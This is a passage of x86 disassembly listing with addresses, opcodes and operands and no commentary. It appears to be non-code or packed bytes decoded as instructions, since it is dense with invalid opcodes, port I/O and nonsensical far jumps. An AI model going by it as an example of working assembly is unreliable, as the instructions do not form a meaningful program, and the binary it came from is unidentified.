  40f48b:	jle    0x40f47d
  40f48d:	cmc    
  40f48e:	cs jge 0x40f413
  40f491:	jns    0x40f484
  40f493:	cmp    al,0x8d
  40f495:	or     DWORD PTR [eax-0xccdfb1b],ebx
  40f49b:	adc    ah,dl
  40f49d:	fadd   DWORD PTR [edx-0xe175b57]
  40f4a3:	adc    DWORD PTR [edx],0xffffffdf
  40f4a6:	cld    
  40f4a7:	push   0xb
  40f4a9:	mov    dh,0xad
  40f4ab:	mov    bl,dh
  40f4ad:	mov    al,ds:0x10b6e3f7
  40f4b2:	stos   BYTE PTR es:[edi],al
  40f4b3:	sub    DWORD PTR [edi],0xbfa495e5
  40f4b9:	pusha  
  40f4ba:	shr    ch,cl
  40f4bc:	mov    ah,0x23
  40f4be:	push   ebx
  40f4bf:	mov    bl,0xb8
  40f4c1:	push   ebp
  40f4c2:	xchg   ebp,eax
  40f4c3:	fist   DWORD PTR [esi]
  40f4c5:	adc    dh,dl
  40f4c7:	scas   al,BYTE PTR es:[edi]
  40f4c8:	sub    BYTE PTR [ebx],bh
  40f4ca:	jg     0x40f53d
  40f4cc:	jg     0x40f52c
  40f4ce:	es ja  0x40f489
  40f4d1:	jge    0x40f4f9
  40f4d3:	scas   al,BYTE PTR es:[edi]
  40f4d4:	repz add dh,cl
  40f4d7:	lds    esi,FWORD PTR [esi-0x341f4640]
  40f4dd:	mov    ecx,0x80f2ce62
  40f4e2:	inc    ebx
  40f4e3:	sbb    DWORD PTR [edi-0x5c],esi
  40f4e6:	cmp    esi,DWORD PTR [eax]
  40f4e8:	dec    eax
  40f4e9:	mov    dl,0x5b
  40f4eb:	xor    eax,0x5a7967aa
  40f4f0:	xor    esp,DWORD PTR [eax]
  40f4f2:	outs   dx,BYTE PTR ds:[esi]
  40f4f3:	mov    ebp,0xecbd837e
  40f4f8:	mov    cs,WORD PTR [ecx+0x7d]
  40f4fb:	stc    
  40f4fc:	sbb    ah,dh
  40f4fe:	cmp    edx,DWORD PTR [edi+ebx*4+0x75]
  40f502:	mov    BYTE PTR ds:[esi],0x69
  40f506:	out    dx,eax
  40f507:	outs   dx,DWORD PTR ds:[esi]
  40f508:	lods   al,BYTE PTR ds:[esi]
  40f509:	loope  0x40f4ed
  40f50b:	pop    esp
  40f50c:	lods   eax,DWORD PTR ds:[esi]
  40f50d:	and    BYTE PTR [ecx+0x20],0x64
  40f511:	jp     0x40f4e1
  40f513:	xchg   ecx,eax
  40f514:	(bad)  
  40f515:	lods   al,BYTE PTR ds:[esi]
  40f516:	cwde   
  40f517:	add    eax,0x76936052
  40f51c:	push   esi
  40f51d:	fdivr  QWORD PTR [edi+0x2a]
  40f520:	adc    edi,DWORD PTR [eax]
  40f522:	lahf   
  40f523:	hlt    
  40f524:	jb     0x40f4ed
  40f526:	mov    ch,0x61
  40f528:	xchg   esi,eax
  40f529:	mov    ?,WORD PTR [eax+0x3750049d]
  40f52f:	dec    ebx
  40f530:	push   0xffffff8a
  40f532:	xchg   ebp,eax
  40f533:	mov    cl,0xe2
  40f535:	repnz imul esp,DWORD PTR [edx+ebp*8],0xffffffce
  40f53a:	jne    0x40f53a
  40f53c:	sahf   
  40f53d:	test   BYTE PTR [ebx-0x2a],cl
  40f540:	push   ds
  40f541:	mov    edx,0x8b78d6a1
  40f546:	jle    0x40f503
  40f548:	jle    0x40f597
  40f54a:	jae    0x40f509
  40f54c:	js     0x40f5c3
  40f54e:	dec    edi
  40f54f:	or     ax,0xfe1a
  40f553:	test   al,0x1f
  40f555:	inc    esi
  40f556:	jle    0x40f53d
  40f558:	xchg   edx,eax
  40f559:	adc    DWORD PTR [eax],0x2f72bcd2
  40f55f:	or     DWORD PTR [eax-0xf],edi
  40f562:	pop    eax
  40f563:	repnz leave 
  40f565:	sahf   
  40f566:	jg     0x40f5e1
  40f568:	push   cs
  40f569:	push   cs
  40f56a:	and    al,0xc9
  40f56c:	aaa    
  40f56d:	sub    BYTE PTR [ebp+0x60efd3b7],dh
  40f573:	aad    0xfe
  40f575:	mov    ah,bl
  40f577:	out    dx,al
  40f578:	repnz aaa 
  40f57a:	inc    eax
  40f57b:	into   
  40f57c:	hlt    
  40f57d:	ins    BYTE PTR es:[edi],dx
  40f57e:	pop    ebx
  40f57f:	jle    0x40f563
  40f581:	sub    eax,0xdd5704d4
  40f586:	jae    0x40f5dd
  40f588:	mov    ds:0x70b7a8c0,eax
  40f58d:	scas   eax,DWORD PTR es:[edi]
  40f58e:	test   DWORD PTR [ebx],edi
  40f590:	(bad)  
  40f591:	xlat   BYTE PTR ds:[ebx]
  40f592:	jb     0x40f5f6
  40f594:	add    ecx,DWORD PTR [edi]
  40f596:	ins    DWORD PTR es:[edi],dx
  40f597:	icebp  
  40f598:	pop    ecx
  40f599:	call   0x73ec24aa
  40f59e:	push   edx
  40f59f:	fisttp DWORD PTR [eax-0x47]
  40f5a2:	dec    eax
  40f5a3:	mov    bl,BYTE PTR ss:[edx-0x660e89e2]
  40f5aa:	pop    ebx
  40f5ab:	cwde   
  40f5ac:	inc    ecx
  40f5ad:	push   esi
  40f5ae:	aad    0xca
  40f5b0:	mov    ds:0x2405fafd,al
  40f5b5:	xchg   ebp,eax
  40f5b6:	rcr    BYTE PTR [ebx],cl
  40f5b8:	inc    eax
  40f5b9:	jle    0x40f573
  40f5bb:	fist   WORD PTR [edx+0x79]
  40f5be:	xchg   ecx,edi
  40f5c0:	mov    ebp,0x5a54de03
  40f5c5:	jg     0x40f579
  40f5c7:	push   cs
  40f5c8:	xchg   BYTE PTR [esi+edi*1-0x12e1613e],ah
  40f5cf:	sub    BYTE PTR [ecx+edi*4-0x1a],bh
  40f5d3:	loope  0x40f636
  40f5d5:	popf   
  40f5d6:	inc    ebx
  40f5d7:	ror    DWORD PTR [ebp-0x58],cl
  40f5da:	pop    edi
  40f5db:	cmp    BYTE PTR [ecx-0x14ca9814],ah
  40f5e1:	lock loopne 0x40f587
  40f5e4:	fisubr WORD PTR [ebx]
  40f5e6:	mov    esi,0x3904f843
  40f5eb:	rol    BYTE PTR [ebp-0x68],cl
  40f5ee:	push   ax
  40f5f0:	daa    
  40f5f1:	neg    edx
  40f5f3:	mov    eax,ds:0xe50d2373
  40f5f8:	pop    ds
  40f5f9:	neg    DWORD PTR [edx]
  40f5fb:	or     DWORD PTR [ebx+0x2f],ebp
  40f5fe:	retf   
  40f5ff:	adc    DWORD PTR [esp+edx*8],0xf423c092
  40f606:	bound  edx,QWORD PTR ds:0x706054ad
  40f60c:	fistp  QWORD PTR [eax+0x72]
  40f60f:	iret   
  40f610:	push   esp
  40f611:	ins    BYTE PTR es:[edi],dx
  40f612:	pop    ds
  40f613:	jb     0x40f5c6
  40f615:	dec    esp
  40f616:	rol    BYTE PTR [edx],cl
  40f618:	(bad)  [ecx]
  40f61a:	cmp    DWORD PTR [edx-0x49],esi
  40f61d:	jae    0x40f5c2
  40f61f:	mov    ah,0x6a
  40f621:	push   eax
  40f622:	mov    DWORD PTR [ebx],ebx
  40f624:	push   ss
  40f625:	iret   
  40f626:	les    edi,FWORD PTR [edi+0x9]
  40f629:	sbb    ah,BYTE PTR [edi]
  40f62b:	adc    eax,DWORD PTR [ebp+edi*4+0x7d]
  40f62f:	mov    ebp,0xe3667945
  40f634:	add    eax,0x63ff4dbb
  40f639:	fdiv   DWORD PTR ds:0xe4accc6d
  40f63f:	mov    edx,0x35bc606d
  40f644:	imul   edi,DWORD PTR gs:[ebx],0xc98fd9c1
  40f64b:	popf   
  40f64c:	(bad)  
  40f64d:	std    
  40f64e:	mov    esp,0x5554daf7
  40f653:	xchg   edx,eax
  40f654:	jb     0x40f5e7
  40f656:	(bad)  
  40f657:	fld    DWORD PTR [ebx+0xd049038]
  40f65d:	inc    ecx
  40f65e:	leave  
  40f65f:	push   ds
  40f660:	out    dx,al
  40f661:	adc    cl,dl
  40f663:	sbb    dh,BYTE PTR [esi+0x441edf20]
  40f669:	das    
  40f66a:	cmp    ebp,ebx
  40f66c:	out    dx,al
  40f66d:	(bad)  
  40f66e:	xchg   DWORD PTR ds:[ebx],ebp
  40f671:	popa   
  40f672:	fisubr DWORD PTR [ebx+edi*4]
  40f675:	push   ss
  40f676:	xor    bl,ah
  40f678:	fs repz mov ch,0x68
  40f67c:	mov    esp,0xd200eeb9
  40f681:	add    ecx,0xffffffff
  40f684:	out    dx,al
  40f685:	ins    DWORD PTR es:[edi],dx
  40f686:	and    ebx,DWORD PTR [eax-0x3c02181c]
  40f68c:	dec    edi
  40f68d:	pop    eax
  40f68e:	outs   dx,DWORD PTR ds:[esi]
  40f68f:	frstor [edi-0x61]
  40f692:	inc    ecx
  40f693:	int3   
  40f694:	shl    eax,cl
  40f696:	cld    
  40f697:	and    dh,ah
  40f699:	push   eax
  40f69a:	out    0xed,al
  40f69c:	outs   dx,BYTE PTR ds:[esi]
  40f69d:	xor    bl,BYTE PTR [eax+eax*4-0x471c12b]
  40f6a4:	mov    ds,WORD PTR [eax]
  40f6a6:	sub    edx,ecx
  40f6a8:	dec    ecx
  40f6a9:	outs   dx,BYTE PTR ds:[esi]
  40f6aa:	push   edx
  40f6ab:	ins    BYTE PTR es:[edi],dx
  40f6ac:	stc    
  40f6ad:	sti    
  40f6ae:	(bad)  
  40f6af:	shl    BYTE PTR [esi],cl
  40f6b1:	mov    dl,BYTE PTR [edx-0x3823290b]
  40f6b7:	jp     0x40f6b2
  40f6b9:	inc    edi
  40f6ba:	pusha  
  40f6bb:	dec    BYTE PTR [edx]
  40f6bd:	loope  0x40f67e
  40f6bf:	(bad)  
  40f6c0:	fisub  DWORD PTR [edx-0x47]
  40f6c3:	aas    
  40f6c4:	fisub  WORD PTR [esi+0xf043184]
  40f6ca:	(bad)  
  40f6cc:	aad    0x3b
  40f6ce:	push   esi
  40f6cf:	cmp    dh,BYTE PTR [esp+edx*2]
  40f6d2:	jge    0x40f698
  40f6d4:	aaa    
  40f6d5:	jp     0x40f6c4
  40f6d7:	mov    al,0xd8
  40f6d9:	ss aam 0xbb
  40f6dc:	mov    ah,0x9c
  40f6de:	pop    ebx
  40f6df:	fwait
  40f6e0:	(bad)  
  40f6e1:	out    dx,al
  40f6e2:	add    BYTE PTR [ebp-0x34],0x3c
  40f6e6:	lahf   
  40f6e7:	sbb    bl,BYTE PTR [esi]
  40f6e9:	test   BYTE PTR [ebx-0x3dde42db],cl
  40f6ef:	pop    esp
  40f6f0:	(bad)
  40f6f5:	xor    BYTE PTR [ebx],dl
  40f6f7:	cmp    ebx,esi
  40f6f9:	pop    esi
  40f6fa:	cli    
  40f6fb:	(bad)
  40f6ff:	xchg   esp,eax
  40f700:	fidiv  WORD PTR [edx+0x6aba9144]
  40f706:	pop    edi
  40f707:	cmp    eax,0xcc8c57aa
  40f70c:	mov    bl,0xa3
  40f70e:	pushf  
  40f70f:	test   BYTE PTR [edx+eiz*8-0xf2b94fa],bl
  40f716:	dec    edx
  40f717:	xchg   edi,eax
  40f718:	fist   WORD PTR [ecx]
  40f71a:	sub    bl,BYTE PTR [esi+0x75]
  40f71d:	das    
  40f71e:	xchg   DWORD PTR [eax+0xc],edx
  40f721:	pop    ds
  40f722:	adc    bh,bl
  40f724:	in     al,dx
  40f725:	push   ss
  40f726:	call   0xa1f7:0xc774f515
  40f72d:	pop    edx
  40f72e:	fdivr  DWORD PTR [edi-0x44]
  40f731:	push   ebp
  40f732:	push   es
  40f733:	test   al,0x78
  40f735:	mov    edi,0x572efa5b
  40f73a:	bound  ebp,QWORD PTR [esi]
  40f73c:	test   al,0x51
  40f73e:	iret   
  40f73f:	mov    BYTE PTR [eax-0x7e],ch
  40f742:	loope  0x40f6f6
  40f744:	xor    ch,bh
  40f746:	mov    WORD PTR [edx+0x28020dbb],?
  40f74c:	mov    edx,0xddc6a018
  40f751:	or     bl,BYTE PTR [ebx]
  40f753:	test   DWORD PTR [esi],edx
  40f755:	fwait
  40f756:	mov    al,ds:0x148d6f21
  40f75b:	dec    ebx
  40f75c:	jns    0x40f721
  40f75e:	in     al,dx
  40f75f:	jmp    0xcfab:0xe693522f
  40f766:	rcl    DWORD PTR [edx+esi*2-0x18],1
  40f76a:	mov    edi,0xe0329936
  40f76f:	xchg   esp,eax
  40f770:	add    BYTE PTR [ebx-0x19],dh
  40f773:	int    0xea
  40f775:	shr    BYTE PTR [esi+0x4f],cl
  40f778:	xchg   ebx,eax
  40f779:	adc    eax,DWORD PTR ds:0x8df0b72e
  40f77f:	mov    cl,0xf1
  40f781:	dec    edi
  40f782:	sbb    esp,DWORD PTR [esi+edx*2-0x7e]
  40f786:	cli    
  40f787:	stos   DWORD PTR es:[edi],eax
  40f788:	xor    esp,DWORD PTR [eax+0x1d]
  40f78b:	pop    ebp
  40f78c:	mov    edi,0x94936106
  40f791:	(bad)  
  40f792:	inc    esp
  40f793:	int    0x17
  40f795:	mov    edi,0x37e9e69b
  40f79a:	sbb    eax,0xe865c7c9
  40f79f:	dec    edi
  40f7a0:	shl    eax,1
  40f7a2:	mov    edi,0x39bf21e7
  40f7a7:	pop    eax
  40f7a8:	dec    esi
  40f7a9:	dec    esi
  40f7aa:	dec    edi
  40f7ab:	cmp    cl,0x70
  40f7ae:	xor    BYTE PTR [eax],0x71
  40f7b1:	or     eax,0x19054620
  40f7b6:	jbe    0x40f78c
  40f7b8:	push   0x623893a8
  40f7bd:	xor    esi,DWORD PTR [ebp-0x6e6bbdc1]
  40f7c3:	jb     0x40f80b
  40f7c5:	adc    cl,BYTE PTR [edi+0x738f9b2f]
  40f7cb:	jo     0x40f815
  40f7cd:	retf   
  40f7ce:	test   al,0x5b
  40f7d0:	rcr    DWORD PTR [edi],cl
  40f7d2:	xor    ebp,edx
  40f7d4:	sti    
  40f7d5:	mov    dh,0xc3
  40f7d7:	fisubr DWORD PTR [ebp-0x17]
  40f7da:	jecxz  0x40f839
  40f7dc:	in     eax,0xdb
  40f7de:	iret   
  40f7df:	pop    es
  40f7e0:	push   ds
  40f7e1:	fist   WORD PTR [eax]
  40f7e3:	ja     0x40f828
  40f7e5:	ret    
  40f7e6:	xor    BYTE PTR [edi],bh
  40f7e8:	test   BYTE PTR [edx+0x14],ah
  40f7eb:	jbe    0x40f793
  40f7ed:	aam    0x7f
  40f7ef:	adc    al,0xbb
  40f7f1:	or     al,0x2c
  40f7f3:	loop   0x40f78b
  40f7f5:	lahf   
  40f7f6:	sbb    dl,cl
  40f7f8:	xor    DWORD PTR [ecx],ebx
  40f7fa:	mov    al,ds:0xc332f469
  40f7ff:	ins    DWORD PTR es:[edi],dx
  40f800:	(bad)  
  40f802:	xor    cl,BYTE PTR [edi]
  40f804:	and    eax,0x7c3f8a6c
  40f809:	and    eax,0x8c27e75b
  40f80e:	sub    esi,esp
  40f810:	enter  0x5d74,0x42
  40f814:	sbb    al,0x1
  40f816:	pop    ecx
  40f817:	shr    esp,0xf
  40f81a:	ins    DWORD PTR es:[edi],dx
  40f81b:	loope  0x40f821
  40f81d:	int    0x5b
  40f81f:	add    al,bl
  40f821:	mov    ebx,DWORD PTR [ebx-0x4]
  40f824:	sbb    esi,esi
  40f826:	push   ss
  40f827:	or     ch,BYTE PTR ds:[edi+ebx*1+0x34]
  40f82c:	xchg   ebp,eax
  40f82d:	xor    edi,DWORD PTR [edx-0x16]
  40f830:	(bad)  
  40f831:	mov    ds:0xfe6d97cb,al
  40f836:	dec    edi
  40f837:	inc    ebx
  40f838:	rcr    edx,0xfc
  40f83b:	and    ah,bh
  40f83d:	not    DWORD PTR [edx+0x4ac3a2b6]
  40f843:	fisttp WORD PTR [ebx-0x56]
  40f846:	lods   al,BYTE PTR ds:[si]
  40f848:	ss xchg ebp,eax
  40f84a:	repz jae 0x40f87d
  40f84d:	xor    bh,dl
  40f84f:	bound  ebp,QWORD PTR [edx+0x32857e87]
  40f855:	fld    DWORD PTR [ebx+ebx*4+0x6e]
  40f859:	mov    esp,0x27dd5f55
  40f85e:	dec    ebx
  40f85f:	jecxz  0x40f894
  40f861:	daa    
  40f862:	aaa    
  40f863:	in     al,0x48
  40f865:	js     0x40f894
  40f867:	sub    eax,0x3eb2bdb4
  40f86c:	jae    0x40f80b
  40f86e:	bound  edi,QWORD PTR [esp+edx*8-0x23]
  40f872:	mov    dh,bh
  40f874:	test   al,0x1
  40f876:	cmc    
  40f877:	jmp    0x406b943a
  40f87c:	cmp    eax,esp
  40f87e:	lods   eax,DWORD PTR ds:[esi]
  40f87f:	cmp    bl,ch
  40f881:	sub    ah,ah
  40f883:	inc    edx
  40f884:	mov    DWORD PTR [ebx+0x78],edi
  40f887:	fbstp  TBYTE PTR [ecx]
  40f889:	sub    al,0xe3
  40f88b:	lea    ecx,[eax+edi*1]
  40f88e:	cmp    BYTE PTR [edx+eax*8+0x3d],al
  40f892:	cli    
  40f893:	mov    al,ds:0x8047667e
  40f898:	pop    esi
  40f899:	test   BYTE PTR [esi+0x2ffa4212],al
  40f89f:	add    bh,al
  40f8a1:	sbb    al,0x42
  40f8a4:	dec    ebp
  40f8a5:	imul   eax,DWORD PTR [esi+0x1a],0xa912207d
  40f8ac:	scas   al,BYTE PTR es:[edi]
  40f8ad:	or     dh,BYTE PTR [edx+0x542e40d6]
  40f8b3:	ja     0x40f872
  40f8b5:	lahf   
  40f8b6:	inc    edx
  40f8b7:	sub    DWORD PTR [ecx-0x18],esi
  40f8ba:	clc    
  40f8bb:	push   0xee4bca90
  40f8c0:	imul   esp,DWORD PTR [edx+0xed26fb6],0xf553478d
  40f8ca:	dec    esp
  40f8cb:	xchg   ecx,eax
  40f8cc:	lock cmp al,0x53
  40f8cf:	sbb    BYTE PTR [edx-0x36],dl
  40f8d2:	in     eax,dx
  40f8d3:	out    0x9,eax
  40f8d5:	mov    ebp,0xeb1d6c69
  40f8da:	and    esi,DWORD PTR [esi]
  40f8dc:	dec    edx
  40f8dd:	push   eax
  40f8de:	leave  
  40f8df:	pusha  
  40f8e0:	ret    0x6474
  40f8e3:	pop    edx
  40f8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8e5:	and    eax,0xed43b91e
  40f8ea:	ret    0x120b
  40f8ed:	mov    esp,0x9c2074f1
  40f8f2:	push   ss
  40f8f3:	jns    0x40f8aa
  40f8f5:	push   ds
  40f8f6:	mov    eax,ds:0x17c66cbc
  40f8fb:	or     DWORD PTR [edx+0x7f],esp
  40f8fe:	mov    al,ds:0x79f004ef
  40f903:	xor    BYTE PTR [eax+0x3e233a76],0xfa
  40f90a:	mov    ds:0xf94acf40,al
  40f90f:	cli    
  40f910:	inc    ecx
  40f911:	push   edi
  40f912:	cli    
  40f913:	xchg   edx,eax
  40f914:	push   es
  40f915:	test   al,0x3b
  40f917:	ror    cl,cl
  40f919:	or     BYTE PTR [eax+ebp*2+0x4976591b],al
  40f920:	inc    edx
  40f921:	mov    bl,0x8d
  40f923:	add    al,BYTE PTR [ebp+eiz*2+0x1]
  40f927:	mov    DWORD PTR [edi],eax
  40f929:	fiadd  WORD PTR [esp+eax*2+0x6a0615fb]
  40f930:	inc    eax
  40f931:	inc    esi
  40f932:	inc    ebx
  40f933:	movzx  ecx,WORD PTR [ecx-0x6456a495]
  40f93a:	mov    bh,0xb
  40f93c:	push   es
  40f93d:	jg     0x40f928
  40f93f:	pop    eax
  40f940:	fwait
  40f941:	popf   
  40f942:	in     eax,0x68
  40f944:	jne    0x40f902
  40f946:	daa    
  40f947:	repz sahf 
  40f949:	push   esp
  40f94a:	(bad)  
  40f94c:	add    DWORD PTR [edi+0x6e01f4de],esp
  40f952:	and    al,0x3f
  40f954:	shl    DWORD PTR [edi-0x2513c588],0xe8
  40f95b:	popf   
  40f95c:	push   esi
  40f95d:	cld    
  40f95e:	jns    0x40f8e9
  40f960:	aaa    
  40f961:	cwde   
  40f962:	jne    0x40f91e
  40f964:	in     al,dx
  40f965:	jmp    0x40f95a
  40f967:	jbe    0x40f92c
  40f969:	dec    esp
  40f96a:	pop    eax
  40f96b:	cld    
  40f96c:	mov    ch,0xb0
  40f96e:	xchg   esi,eax
  40f96f:	outs   dx,DWORD PTR ds:[esi]
  40f970:	mov    edi,edx
  40f972:	imul   ebp,ecx,0xffffffd4
  40f975:	nop
  40f976:	pop    ss
  40f977:	mov    ds:0x4d2bd837,eax
  40f97c:	pop    ecx
  40f97d:	inc    edi
  40f97e:	stos   BYTE PTR es:[edi],al
  40f97f:	adc    dl,BYTE PTR ds:0x2da745c
  40f985:	repnz out dx,eax
  40f987:	dec    ebp
  40f988:	and    ch,cl
  40f98a:	push   0xffffffe6
  40f98c:	sbb    eax,0x1001a8a8
  40f991:	test   DWORD PTR [edx+ebp*4-0x12],0xdc5584bd
  40f999:	jmp    0x4a98a954
  40f99e:	sbb    DWORD PTR [ecx],0x63d7b829
  40f9a4:	mov    ch,0xb7
  40f9a6:	push   es
  40f9a7:	nop
  40f9a8:	jbe    0x40f9fa
  40f9aa:	add    al,0x55
  40f9ac:	add    eax,0x2edf3254
  40f9b1:	ds mov ecx,0x413183d
  40f9b7:	cld    
  40f9b8:	outs   dx,DWORD PTR ds:[esi]
  40f9b9:	rol    BYTE PTR [ebp-0x79],1
  40f9bc:	out    dx,eax
  40f9bd:	pushf  
  40f9be:	mov    esp,DWORD PTR [ecx+esi*1-0x3c506b3a]
  40f9c5:	ret    0xd622
  40f9c8:	dec    edi
  40f9c9:	sub    BYTE PTR [ecx+0x78ceb077],0x25
  40f9d0:	mov    ecx,0xd032a2e8
  40f9d5:	test   DWORD PTR [ecx-0x51791c75],edx
  40f9db:	outs   dx,DWORD PTR ds:[esi]
  40f9dc:	xchg   esp,eax
  40f9dd:	mov    esp,0xf4088671
  40f9e2:	es loopne 0x40fa44
  40f9e5:	into   
  40f9e6:	sbb    dl,ah
  40f9e8:	xchg   edx,eax
  40f9e9:	or     al,0x91
  40f9eb:	mov    ch,0x51
  40f9ed:	pmaxsw mm5,QWORD PTR [ebx-0x48]
  40f9f1:	inc    eax
  40f9f2:	sti    
  40f9f3:	and    DWORD PTR [esi+ebx*4+0x27915adc],ebx
  40f9fa:	xchg   ebp,eax
  40f9fb:	sub    bl,al
  40f9fd:	cmp    eax,0x67eaa6c4
  40fa02:	push   ds
  40fa03:	int3   
  40fa04:	out    dx,eax
  40fa05:	mov    bh,0x3
  40fa07:	sub    BYTE PTR [ebx],bh
  40fa09:	inc    ebx
  40fa0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa0b:	jl     0x40f9c3
  40fa0d:	popf   
  40fa0e:	cwde   
  40fa0f:	fld    TBYTE PTR [edx-0x1c]
  40fa12:	sub    cl,ah
  40fa14:	fadd   DWORD PTR [ebx-0x5bbebb39]
  40fa1a:	xor    ah,ah
  40fa1c:	inc    ebx
  40fa1d:	aas    
  40fa1e:	(bad)  
  40fa1f:	xchg   edx,eax
  40fa20:	mov    ch,bl
  40fa22:	mov    esi,0x4fef1075
  40fa27:	(bad)  
  40fa28:	in     al,dx
  40fa29:	push   ss
  40fa2a:	jnp    0x40fa18
  40fa2c:	retf   
  40fa2d:	xchg   BYTE PTR [ebp-0x477d893a],ah
  40fa33:	cmp    al,0x24
  40fa35:	and    edx,DWORD PTR [ebp+edi*1-0x143026eb]
  40fa3c:	call   0x273acd11
  40fa41:	push   DWORD PTR [edi]
  40fa43:	dec    ecx
  40fa44:	lods   eax,DWORD PTR ds:[esi]
  40fa45:	les    esp,FWORD PTR [esi-0x44]
  40fa48:	jle    0x40fa0f
  40fa4a:	idiv   al
  40fa4c:	fwait
  40fa4d:	ret    
  40fa4e:	fwait
  40fa4f:	pop    edi
  40fa50:	(bad)  
  40fa51:	dec    edi
  40fa52:	repz and eax,0xc0f1599b
  40fa58:	xor    eax,0x59cb9a8e
  40fa5d:	ins    BYTE PTR es:[edi],dx
  40fa5e:	and    dl,BYTE PTR [eax]
  40fa60:	add    DWORD PTR [ebx+0x54],ecx
  40fa63:	sbb    esp,DWORD PTR [ebx]
  40fa65:	in     al,0x7
  40fa67:	lahf   
  40fa68:	xor    esp,DWORD PTR [esi]
  40fa6a:	xor    bh,BYTE PTR [edx]
  40fa6c:	push   esp
  40fa6d:	dec    edx
  40fa6e:	sub    BYTE PTR [edx],dh
  40fa70:	sbb    eax,0x4272b795
  40fa75:	sbb    BYTE PTR [edx+0x16],dh
  40fa78:	lods   eax,DWORD PTR ds:[esi]
  40fa79:	cwde   
  40fa7a:	jbe    0x40fa6d
  40fa7c:	out    dx,eax
  40fa7d:	out    dx,eax
  40fa7e:	fcom   DWORD PTR [esp+ebx*1+0x2c]
  40fa82:	and    ah,BYTE PTR [edi]
  40fa84:	mov    esp,0x742b96c3
  40fa89:	push   ebp
  40fa8a:	scas   eax,DWORD PTR es:[edi]
  40fa8b:	lahf   
  40fa8c:	inc    edi
  40fa8d:	pop    esi
  40fa8e:	mov    ds:0x847a8e2e,al
  40fa93:	repz mov ecx,DWORD PTR [ebx-0x4770ff63]
  40fa9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa9b:	jmp    0x9ae9:0x598c1528
  40faa2:	pop    edx
  40faa3:	in     eax,dx
  40faa4:	neg    cl
  40faa6:	outs   dx,DWORD PTR ds:[esi]
  40faa7:	inc    ebx
  40faa8:	shl    BYTE PTR [ecx+0x31b99a5b],1
  40faae:	mov    ds:0xf0592bb4,eax
  40fab3:	fmul   QWORD PTR [eax]
  40fab5:	cmp    al,0x3e
  40fab7:	inc    ebx
  40fab8:	mov    esp,0x667382a1
  40fabd:	adc    DWORD PTR [esi-0x3737a458],ebp
  40fac3:	out    dx,al
  40fac4:	jno    0x40fa88
  40fac6:	shr    BYTE PTR [ebx],1
  40fac8:	or     esi,0x31af6a54
  40face:	add    al,0x65
  40fad0:	pop    edx
  40fad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad3:	xchg   edx,eax
  40fad4:	dec    DWORD PTR [esi-0x36f8b77f]
  40fada:	or     bl,cl
  40fadc:	das    
  40fadd:	dec    ecx
  40fade:	jno    0x40fac3
  40fae0:	and    DWORD PTR [ebp-0x59],edi
  40fae3:	dec    ebx
  40fae4:	loope  0x40fb13
  40fae6:	jecxz  0x40fa96
  40fae8:	out    dx,al
  40fae9:	xchg   esp,eax
  40faea:	mov    esi,0xe2e361f7
  40faef:	in     al,0x66
  40faf1:	stos   BYTE PTR es:[edi],al
  40faf2:	out    0xd7,al
  40faf4:	jmp    0xbb92:0x533418d4
  40fafb:	cmp    BYTE PTR ds:0xfc623828,ch
  40fb01:	test   BYTE PTR [edx],dl
  40fb03:	ret    0x8ee1
  40fb06:	add    ah,cl
  40fb08:	mov    bp,0x7391
  40fb0c:	inc    ebp
  40fb0d:	out    0xa6,al
  40fb0f:	call   0xea81:0x62215b1a
  40fb16:	push   0x142acad4
  40fb1b:	sub    eax,0x6fffb6bc
  40fb20:	leave  
  40fb21:	es fwait
  40fb23:	loop   0x40fb78
  40fb25:	fsubp  st(6),st
  40fb27:	das    
  40fb28:	aas    
  40fb29:	(bad)  
  40fb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb2b:	or     ecx,esp
  40fb2d:	(bad)  
  40fb2e:	fnstenv [edx+0x19c05386]
  40fb34:	lea    esp,[eax-0x64886a72]
  40fb3a:	mov    cl,BYTE PTR [esi+0x712ee083]
  40fb40:	jno    0x40fb32
  40fb42:	cmp    ah,BYTE PTR [ebx-0x4e]
  40fb45:	inc    ecx
  40fb46:	icebp  
  40fb47:	fs jg  0x40fb1e
  40fb4a:	mov    ds:0xd48799f8,eax
  40fb4f:	pop    ebx
  40fb50:	sar    BYTE PTR [ecx+0x45],cl
  40fb53:	inc    ebx
  40fb54:	ret    0xfdde
  40fb57:	stos   BYTE PTR es:[edi],al
  40fb58:	lods   eax,DWORD PTR ds:[esi]
  40fb59:	cmovg  edi,DWORD PTR [esi-0x77c19e2f]
  40fb60:	push   es
  40fb61:	fbld   TBYTE PTR [ebx-0x580daeea]
  40fb67:	adc    BYTE PTR [ebp+0x1],dl
  40fb6a:	rol    eax,1
  40fb6c:	sub    DWORD PTR [edi+0x62],ebx
  40fb6f:	ror    DWORD PTR [ebx],0xdf
  40fb72:	jecxz  0x40fb15
  40fb74:	xchg   BYTE PTR [ebx+0x19],cl
  40fb77:	cmp    BYTE PTR [edi+edx*2],bl
  40fb7a:	mov    dl,0x35
  40fb7c:	pop    es
  40fb7d:	add    BYTE PTR [esi+0x2eeb5c78],al
  40fb83:	stos   BYTE PTR es:[edi],al
  40fb84:	cmp    al,al
  40fb86:	inc    ebx
  40fb87:	out    dx,al
  40fb88:	inc    esi
  40fb89:	(bad)  
  40fb8a:	fsubr  QWORD PTR [ebx+esi*1]
  40fb8d:	ja     0x40fb49
  40fb8f:	shl    BYTE PTR [ebx+0x49497b7e],0x94
  40fb96:	xchg   ah,cl
  40fb98:	dec    esi
  40fb99:	loop   0x40fba9
  40fb9b:	jne    0x40fb5a
  40fb9d:	xor    edx,DWORD PTR [edi]
  40fb9f:	lds    esp,FWORD PTR [ebx+0xc5d211d]
  40fba5:	jge    0x40fb2a
  40fba7:	ficomp WORD PTR [eax-0x9ff5341]
  40fbad:	add    edx,edx
  40fbaf:	dec    ecx
  40fbb0:	int    0x38
  40fbb2:	imul   ecx,ebp,0xffffff93
  40fbb5:	cmp    al,0xf1
  40fbb7:	push   0xbaefeb3f
  40fbbc:	scas   al,BYTE PTR es:[edi]
  40fbbd:	pop    edx
  40fbbe:	cmp    ch,BYTE PTR [ecx+0x78]
  40fbc1:	mov    eax,ds:0x345ad024
  40fbc6:	or     esp,edi
  40fbc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbc9:	test   al,0x83
